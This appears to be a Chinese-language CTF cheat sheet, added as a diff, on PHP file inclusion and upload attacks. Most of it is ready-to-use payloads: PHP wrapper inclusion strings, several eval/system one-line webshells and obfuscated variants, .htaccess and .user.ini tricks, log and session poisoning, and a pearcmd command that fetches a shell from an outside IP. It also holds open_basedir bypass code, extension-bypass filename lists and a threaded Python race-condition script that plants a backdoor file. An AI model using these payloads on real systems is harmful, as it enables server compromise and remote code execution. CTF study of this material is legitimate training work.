@@ -1,0 +1,509 @@
+文件包含
+include()文件的内容将作为PHP代码执行，找不到被包含的文件时只会产生警告，脚本将继续运行。
+include_once()唯一区别是如果该文件中的代码已经被包含，则不会再次包含。
+require()找不到被包含的文件时会产生致命错误，并停止脚本运行。
+require_once()唯一区别是如果该文件中的代码已经被包含，则不会再次包含。
+若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。若文件内容不符合 PHP 语法规范则会暴漏其源码。
+
+路径问题
+.（单个点）：表示当前目录。例如，如果当前目录是 /var/www/html，那么 ./phpinfo.txt 就表示 /var/www/html/phpinfo.txt。
+..（两个点）：表示上一级目录。例如，如果当前目录是 /var/www/html，那么 ../phpinfo.txt 就表示 /var/www/phpinfo.txt。
+如果是php文件flag最好用base读，txt直接包含就行
+伪协议操作
+file://
+条件：
+allow_url_fopen：不受影响
+allow_url_include：不受影响
+作用：
+用于访问本地文件系统。
+说明：
+file:// 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。
+在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径
+http://127.0.0.1/?filename=file:///etc/passwd
+
+php://
+条件：
+allow_url_fopen：不受影响
+allow_url_include：仅 php://input、 php://stdin、php://memory、php://temp 需要 on
+作用： 访问各个输入 / 输出流（I/O streams）
+说明： PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。
+php://input	可以访问请求的原始数据的只读流。 如果启用了 enable_post_data_reading 选项， php://input 在使用 enctype="multipart/form-data" 的 POST 请求中不可用。
+php://output	只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。
+php://fd	(>=5.3.6) php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。
+php://memory php://temp	(>=5.1.0) 类似文件 包装器的数据流，允许读写临时数据。 两者的一个区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致。php://temp 的内存限制可通过添加 /maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。
+php://filter/[read|write]=过滤器名称/resource=filename
+read 操作：在读取数据时应用过滤器。
+write 操作：在写入数据时应用过滤器。
+过滤器
+string.rot13：对数据进行 ROT13 变换。
+string.toupper：将字符串转换为大写。
+string.tolower：将字符串转换为小写。
+
+convert.base64-encode：将数据进行 Base64 编码。
+convert.base64-decode：将数据进行 Base64 解码。
+convert.quoted-printable-encode：将数据进行 Quoted-Printable 编码。
+convert.quoted-printable-decode：将数据进行 Quoted-Printable 解码。
+convert.iconv.UTF-8/ISO-8859-1：将数据从 UTF-8 编码转换为 ISO-8859-1 编码（iconv 需要安装）。
+
+zlib.deflate：对数据进行 DEFLATE 压缩。
+zlib.inflate：对数据进行 DEFLATE 解压缩。
+zlib.encode：对数据进行 gzip 编码。
+zlib.decode：对数据进行 gzip 解码。
+
+resource=php://input：读取请求的原始数据。
+resource=php://stdin：读取标准输入。
+resource=php://stdout：写入标准输出。
+resource=php://stderr：写入标准错误输出。
+file_put_contents(a,b)将b的内容写入a中，正好触发了write
+file_get_contents（）直接触发read
+
+*用phar协议
+创建一个一句话木马文件`1.php`，内容为：`<?php @system($_GET[0]);?>`。然后压缩成zip文件，随后修改后缀名为.png或者.jpg，上传该文件
+?file=phar://upload/1.jpg/1&0=cat%20/f1aaaag
+*用zip协议
+压缩成zip文件，随后修改后缀名为.png或者.jpg，上传该文件
+?file=zip://upload/1.jpg%231&0=cat /f1aaggggg
+
+绕过死亡die
+// 需要URL编码
+GET: ?file=php://filter/write=convert.base64-decode/resource=1.php
+?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
+// 需要base64编码，编码后最前面添加两个字母如：aa
+POST: content=<?php system('cat f*');
+content=aaPD9waHAgcGhwaW5mbygpOz8+
+或
+// 需要URL编码
+GET: ?file=php://filter/write=string.rot13/resource=1.php
+?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30
+// 需要Rot13编码
+POST: content=<?php system('cat f*');
+content=<?cuc cucvasb();?>
+或
+?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php
+/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%37%30%25%35%66%25%37%34%25%36%31%25%36%37%25%37%33%25%37%63%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30
+post传入 <?php phpinfo();
+PD9waHAgcGhwaW5mbygpOw==
+或
+file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
+ post:contents=?<hp pvela$(P_SO[T]1;)>?
+
+
+
+文件包含配合伪协议
+include($file)
+?file=php://filter/convert.base64-encode/resource=flag.php
+?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%35%25%36%45%25%36%33%25%36%46%25%36%34%25%36%35/resource=flag.php   //二次编码解很多题
+?data://text/plain,<?php system('ls');?>
+?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==   //<?=system('tac flag.php');?>
+?file=php://filter/convert.iconv.ASCII.UCS-2BE/resource=flag.php
+?file=compress.zlib:///var/www/html/flag.php
+      compress.zlib://data:@baidu.com/baidu.com,phpinfo() 构造思路：`@`使`data:`被解释为用户名和密码 baidu.com/baidu.com 只要它包含了 /，通常被认为是合法的 media-type。 
+																	 作为有效的压缩流，而是将整个 URL 作为字面文本读取了。file_get_contents结果是phpinfo() 
+
+?file=phar://test.zip/shell.txt   //相对路径 phar	把shell.txt压缩成test.zip文件							 
+																	 
+																	 
+																	 
+																	 根据hint，可以通过包含nginx的日志文件access.log进行文件包含操作。使用?file=/var/log/nginx/access.log访问日志，发现会留有记录。
+修改UA头，发现可以执行phpinfo命令：<?=phpinfo();?>
+
+*?file=php://input   bp传post <?php system('cat flag.php');?>
+
+.htaccess包含
+php_value auto_append_file /tmp/webshell.txt
+php_value auto_append_file /temp/sess_xxxxxx
+先执行其他php完再包含/tmp/webshell
+自己包含自己会将注释句子一起执行
+php_value auto_append_file .htaccess
+#<?php echo(123);eval($_POST[0]);?>
+
+
+见到shtml考虑ssi
+.htaccess
+AddType text/html .shtml
+AddHandler server_parsed .shtml
+Options Includes
+
+1.shtml
+<pre>
+<!--#exec cmd="whomai"-->
+</pre>
+
+
+传统条件竞争不可取
+条件竞争php7.0
+file=php://filter/strip_tags/resource=/ect/passwd  会报错不执行
+post传文件就直接永久保存下来，在phpinfo界面找file包含即可
+
+自包含(题中的包含或者.htaccess包含 php_value auto_append_file 1.txt)，上传，phpinfo页面，这几个保证在一个界面，在自包含下给phpinfo界面传文件，
+自包含shell
+1.txt
+<?
+echo ('1.txt is ready');
+file_put_contents('/tmp/shell.php','<?php echo('haha,is OK');eval($_POST[0]);?>');
+
+
+日志文件包含   
+/var/log/nginx/access.log，利用ua头即可包含
+
+
+包含environ
+- php以cgi方式运行，这样environ才会保持UA头。
+- environ文件存储位置已知，且environ文件可读。
+- 每个用户都有属于自己的environ环境
+
+
+session文件包含
+能赋值就直接赋值包含
+不行就进度条
+/tem/sess_PHPSESSID
+/var/lib/php/session/sess_PHPSESSID
+这里的PHPSESSID是cookie当用户控制时（session.use_struct_mode开）随便写入，利用session进度条，利用写的HTML，随便传抓包，确保有Cookie: PHPSESSID=xxxxxxx并找到其位置  /sess_xxxxxx
+默认是一直删除，所以一直重发session页面的包，并且一直重发包含session文件的页面包含进去
+
+pear文件包含
+条件：
+1 有文件包含点
+2 开启了pear扩展
+3 配置文件中register_argc_argv 设置为On,而默认为Off
+PEAR扩展
+PHP Extension and Application Repository
+默认安装位置是  /usr/local/lib/php/  
+包含测试?file=/usr/local/lib/php/pearcmd.php&version
+利用Pear扩展进行文件包含
+方法一  远程文件下载
+?file=/usr/local/lib/php/pearcmd.php&ctfshow+install+-R+/var/www/html/+http://47.236.120.83/shell.php  //shell密码是cmd
+方法二  生成配置文件，配置项传入我们恶意的php代码的形式
+上传ctfshow.php
+a=b
+username=root
+man_dir=<?php eval($_POST[1]);?>
+GET /?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/ctf.php+-d+man_dir=<?eval($_POST[1]);?>+-s+ 
+然后直接利用密码是1
+方法三  写配置文件方式
+GET /?file=/usr/local/lib/php/pearcmd.php&aaaa+config-create+/var/www/html/<?=`$_POST[1]`;?>+1.php 
+访问http://<靶场服务器IP>/1.php
+
+远程文件包含
+通过域转数字的形式，可以不用.来构造远程文件地址
+http://www.msxindl.com/tools/ip/ip_num.asp
+?file=http://731540450/1
+
+open_basedir突破
+利用闭合直接`glob`获取根目录的文件名
+?><?php
+var_dump(scandir('glob:///*'));?>
+
+或者利用`glob+DirectoryIterator`获取根目录的文件名，新建glob.php文件，内容如下
+<?php 
+$it = new DirectoryIterator("glob:///*"); 
+foreach($it as $f) {     
+echo $f->__toString()."<br/>";
+}
+直接通过蚁剑链接，将glob.php上传再访问找到flag名
+
+利用`ini_set、mkdir、chdir`来获取文件内容，新建flag.php文件，内容如下
+<?php 
+mkdir('tmpdir'); chdir('tmpdir'); 
+ini_set(‘open_basedir','..');
+chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir(‘..');
+ini_set('open_basedir','/'); 
+$a=file_get_contents('/f11aggg'); 
+var_dump($a); 
+?>
+访问即可得到flag
+
+
+nginx大文件上传缓存文件利用
+
+pcache扩展生成缓存文件利用
+
+有任意文件读取，前面双写绕过/.的过滤
+
+/?tpl=...//...//...//...//...//...//...//...//etc/passwd
+
+flag在flag.php里，源码对最后一个.后的后缀名进行判断，无法直接绕过读取flag.php，查看phpinfo
+
+/?tpl=debug
+
+发现开启了`opcache`，他会缓存php文件进入指定缓存文件夹，路径为`缓存文件夹/[system_id]/var/www/html/flag.php.bin`
+
+只要访问这个bin文件即可绕过后缀过滤，查看phpinfo发现缓存文件夹为`/var/www/a/`，主要是计算`system_id`，有现成工具`php7-opcache-override(https://github.com/GoSecure/php7-opcache-override)`
+
+![image-20220709010309116](assets/image-20220709010309116.png)
+
+用法：
+
+```
+python3 system_id_scraper.py info.html 或者 python3 system_id_scraper.py url
+
+# info.html为phpinfo的前端信息界面另存为所得
+# url为phpinfo地址
+```
+
+例如本题
+
+![image-20221014171520](assets/image-20221014171520.png)
+
+![image-20220709010513782](assets/image-20220709010513782.png)
+
+算出`system_id`为`1116d566fdc53f79abce6c01e3a0308d`
+
+所以先访问`flag.php`使其产生缓存文件（这一步必须要），之后执行访问如下进行包含即可
+
+```
+/?tpl=...//...//...//...//...//...//...//...//var/www/a/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin
+```
+
+![image-20220709010833246](assets/image-20220709010833246.png)
+
+#flag{Opcache_Succ_ess!!}
+===============================================================================================================================================================================
+
+
+
+文件上传
+<?php的绕过
+<?=
+<script language='php'>phpinfo();</script>
+<% phpinfo();%>      //asp tag少
+思路是找过滤，是内容还是后缀，是白还是黑
+
+前端js检查
+后改为bp
+图片头 GIF89A为第一行
+加入带马的图片
+
+shell总结
+<?echo ('123');eval($_POST[0]);?>
+<?=eval($_POST{1});?>    //过滤[]
+<?=system('tac ../f*')?> //过滤{}[] 
+<script language=”php”>echo '123'; </script>
+<?= eval(array_pop($_REQUEST))?>
+<?= @eval(array_pop($_POST))?>	//传1=system('ls /')
+上传完shell无论是jpg还是php直接包含
+?file=upload/1.jpg&0=tac%20Flag_is_here_acffd72.php
+
+黑名单绕过
+利用fuzz方法快速测试可上传后缀：upload-fuzz-dic-builder()
+    项目地址：https://github.com/c0ny1/upload-fuzz-dic-builder
+    用法：python2 upload-fuzz-dic-builder.py -n shell -a jpg  -l php -m apache --os linux  -o upload_file.txt
+双写
+	php后缀名大小写、点绕过、空格绕过、::$DATA绕过、冒号绕过（Windows特性）
+	php支持的可解析别名：php2, php3, php4, php5, phps, pht, phtm, phtml
+.user.ini上传,先发图片再改为这个.user.ini名字
+	但是这种方式其实是有个前提的，因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。
+	1.写入内容auto_prepend_file=1.txt 再上传1.txt的马不行就写<?=eval($_COOKIE[1]); 传COOKIE：1=eval(base64_decode('cGhwaW5mbygpOw=='))?>
+	2.写入内容auto_prepend_file=php://input
+	上传完直接随便发个东西在bp直接传码就行 
+	3.写入内容auto_prepend_file=/var/log/nginx/access.log
+	上传后ua写码<?php eval($_POST[1]);?>木马，插入日志后就不写ua头直接rce就行，POST不行就COOKIE<?php eval($_COOKIE[1]);?> 1=eval(base64_decode(''))?>COOKIE不解析空格
+	4..user.ini写入内容
+	GIF89a
+	auto_prepend_file=/tmp/sess_shell
+	用session进度条post发包并拦截，马是<?php @eval($_POST["pass"]);?>
+	改Cookie:PHPSESSID=shell,在PHP_SESSION_UPLOAD_PROGRESS的主体的最后一行写<?php fwrite(fopen('1.php','w'),'<?php @eval($_POST["pass"]);?>');?>
+	将该POST数据包与访问upload目录的GET数据包进行条件竞争，访问upload的数据包长度发生变化即创建后门文件成功
+.htaccess文件
+	方式1
+	AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php
+	还支持AddType application/x-httpd-ph\
+	p .png
+	方式2
+	<FilesMatch "png">
+	SetHandler application/x-httpd-php
+	</FilesMatch>
+	如果flag不是php文件，那么还可以像.user.ini一样在当前目录加载一个文件
+	php_value auto_append_file 'flag'
+	基于htaccess的盲注
+基础免杀
+<?php
+$a = "s#y#s#t#e#m";
+$b = explode("#",$a);
+$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
+$c($_REQUEST[1]);
+?>
+
+<?php
+$a=substr('1s',1).'ystem';
+$a($_REQUEST[1]);
+?>
+
+<?php
+$a=strrev('metsys');
+$a($_REQUEST[1]);
+?>
+
+<?php
+$a=$_REQUEST['a'];
+$b=$_REQUEST['b'];
+$a($b);
+?>
+图像检测函数
+- mime_content_type
+- getimagesize和exif_imagetype函数。  
+以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。
+打开 cmd，导航到包含 safe.jpg 和 shell.php 文件的目录，然后运行命令
+copy safe.jpg /b + shell.php /a shell.jpg
+
+文件移动函数
+move_uploaded_file函数会忽略掉文件末尾的`/. `
+
+白名单
+	IIS5.X/6.0
+	目录解析：如果目录采取/1.asp/的命令方式，那么访问该目录下的文件会默认以asp的方式执行
+	文件解析：iis读取到;会默认结束，可以用1.asp;.jpg的形式进行绕过
+	特殊后缀：1.asa、1.cer、1.cdx
+	IIS7/7.5
+	如果配置中开启cgi.fix_pathinf 
+	同nginx解析漏洞
+	Apache解析漏洞：
+	解析漏洞:从右到左判断后缀并解析（低版本）
+	123.php.asaa：Apache会先判断asaa不认识，那就会判断.php它认识就默认以这种方式进行解析。
+	Apache HTTPD 换行解析漏洞（CVE-2017-15715）：shell.php%0a
+	Nginx解析漏洞
+	hack.jpg/1.php
+	nginx看到文件扩展名是.php，便不管该文件是否存在，直接交给php处理，然后php的默认配置下看到右边的文件不存在，便删去最后的文件名，读取前一个，所以将.jpg处理成为php
+	nginx 文件名逻辑漏洞（CVE-2013-4547）：shell.gif[0x20][0x00].php
+	Windows环境
+	shell.php.jpg
+	此时目录中会生成`shell.php`文件，但内容为空。再利用PHP和Windows环境的叠加属性：
+	再上传`shell.>>>`来匹配并覆盖`shell.php`
+	shell.php::$DATA
+	`shell.php `（php后有个空格）
+	`shell.php.`
+shell.phtml
+shell.php%00
+shell.gif[0x20][0x00].php
+shell.php.jpg
+shell.pphphp
+shell.PHP
+shell.php.jpg
+	
+竞争上传
+	先移动，后检测，不符合再删除，符合则改名字
+	使用多线程并发进行上传与访问操作
+查看源代码发现只能上传zip	那我们直接上传一句话就可以了	注意修改Content-Type为application/x-zip-compressed
+然后直接文件包含就可以了	   
+
+条件竞争绕过
+
+查看页面源代码，明显的条件竞争，新建一个文件`shell.php`，内容如下
+
+```php
+<?php fputs(fopen("info.php", "w"), '<?php @eval($_POST["key"]);?>'); ?> 
+```
+
+执行如下脚本进行竞争上传
+
+```py
+# -*- coding:utf-8 -*-
+import requests
+import threading
+import os
+
+class RaceCondition(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.url = 'http://192.168.13.140:8011/uploads/shell.php' #上传的文件地址
+        self.uploadUrl = 'http://192.168.13.140:8011/index.php' #上传文件的地址
+
+    def _get(self):
+        print('try to call uploaded file...')
+        r = requests.get(self.url)
+        if r.status_code == 200:
+            print('[*] create file info.php success.')
+            os._exit(0)
+
+    def _upload(self):
+        print('upload file...')
+        file = {'myfile': open('shell.php', 'r')} #本地脚本木马
+        requests.post(self.uploadUrl, files=file)
+
+    def run(self):
+        while True:
+            for i in range(5):
+                self._get()
+
+            for i in range(10):
+                self._upload()
+                self._get()
+
+if __name__ == '__main__':
+    threads = 50    
+
+    for i in range(threads):
+        t = RaceCondition()
+        t.start()
+
+    for i in range(threads):
+        t.join() 
+```
+
+成功后访问`./uploads/info.php`
+
+
+补充：phpinfo页面
+1. PHP 版本信息
+重要性: 通过了解PHP的具体版本，你可以查找该版本已知的漏洞。不同PHP版本可能存在不同的安全问题，例如远程代码执行、文件包含漏洞等。
+如何利用: 查找并利用该PHP版本的CVE（Common Vulnerabilities and Exposures）漏洞。例如，较旧版本的PHP可能存在未修复的远程代码执行漏洞。
+位置: phpinfo()输出的顶部通常显示“PHP Version”字段。
+2. 加载的PHP模块
+重要性: 加载的模块揭示了服务器支持的功能。例如，curl模块允许网络请求，gd模块提供图像处理功能。某些模块可能引入额外的攻击向量。
+如何利用: 通过加载的模块，可以识别出特定模块的漏洞并利用它们。例如，openssl模块的配置可能存在安全隐患。
+位置: phpinfo()页面的扩展模块部分。
+3. 配置选项
+关键配置:
+disable_functions: 列出被禁用的PHP函数。了解未禁用的函数可以帮助你选择可能的攻击方法，例如使用system()执行命令。
+allow_url_fopen 和 allow_url_include: 如果启用，可以进行远程文件包含攻击，从而执行远程代码。
+open_basedir: 限制PHP脚本只能访问指定目录，可以帮助你确定攻击的有效范围。
+file_uploads: 查看是否允许文件上传，这有助于判断是否可以上传恶意文件进行进一步攻击。
+3register_argc_argv 设置为On,而默认为Off，pear包含
+
+如何利用: 根据配置判断服务器的攻击面，例如，如果allow_url_include启用，可以尝试远程文件包含攻击。
+位置: 在phpinfo()页面的“Core”部分或其他配置部分。
+4. 环境变量
+重要性: 环境变量可能包含敏感信息，如数据库凭证、API密钥或文件路径。这些信息可以用于进一步的攻击。
+如何利用: 使用暴露的环境变量信息进行横向移动或提高权限，访问更多敏感数据。
+位置: 在phpinfo()页面的“Environment”部分。
+5. 文件路径信息
+重要性: 文件路径（如DOCUMENT_ROOT或SCRIPT_FILENAME）揭示了服务器的文件系统结构，帮助你进行目录遍历或文件包含攻击。
+如何利用: 结合路径信息，尝试访问敏感文件或利用文件包含漏洞。
+位置: 在页面的“Apache Environment”或“PHP Variables”部分。
+6. Session 和 Cookie 配置
+重要性: Session和Cookie的配置信息可以揭示会话管理的弱点，例如，未标记为secure的Cookie可能被窃取。
+如何利用: 通过不安全的Session配置，可能进行会话固定攻击或会话劫持。
+位置: 在phpinfo()页面的“Session”部分。
+7. HTTP 头信息和服务器信息
+重要性: 服务器使用的具体软件（如Apache或Nginx）及其版本，以及特定的HTTP头信息，可以帮助你识别服务器配置的弱点。
+如何利用: 使用暴露的服务器信息选择合适的攻击方法或尝试服务器特定的已知漏洞。
+位置: 在页面顶部的“System”和“Server API”部分。
+8. 编译信息
+重要性: PHP的编译选项和信息可以揭示服务器的配置细节，帮助识别潜在的配置漏洞。
+如何利用: 利用特定的编译选项进行漏洞利用，或通过配置选项确定服务器的安全性。
+位置: 在页面的“Configure Command”部分。
+9. 其他敏感信息
+重要性: phpinfo()页面可能泄露其他敏感信息，如数据库连接配置、SMTP设置、API密钥等，这些信息可能直接用于未授权访问或进一步的攻击。
+如何利用: 直接使用暴露的敏感信息进行攻击，例如通过泄露的数据库凭证获取数据库访问权限。
+位置: 这些信息散布在页面的各个部分，需仔细检查。
+防范措施和建议
+限制访问: 确保phpinfo()页面不对公众开放，使用IP白名单或认证限制访问。
+删除或禁用: 在生产环境中，尽量删除或禁用phpinfo()函数，避免泄露服务器配置信息。
+加强监控: 监控phpinfo()页面的访问，防止敏感信息的泄露。
+通过全面分析phpinfo()页面提供的信息，CTF选手可以识别出服务器的潜在漏洞，并制定出有效的攻击策略。这些信息不仅能帮助你理解目标环境，还能直接助力漏洞的发现和利用
+
+
+上传文件的探测
+功能: 使用一些在线或自建的测试脚本，探测是否允许文件上传。
+使用方法:
+尝试上传不同类型的文件（如.php, .jpg）并观察服务器响应。
+使用Web应用测试工具（如OWASP ZAP）中的文件上传探测功能。
+结果: 通过响应状态码或文件路径的返回，判断文件上传的成功与否及其可能的利用方式。
+
+Nikto
+功能: Nikto是一款开源的Web服务器扫描器，用于检测Web服务器的漏洞和配置问题。
+使用方法:
+bash
+复制代码
+nikto -h http://example.com
+结果: 能够发现服务器暴露的敏感文件、配置文件和其他潜在漏洞，并显示PHP版本等信息。
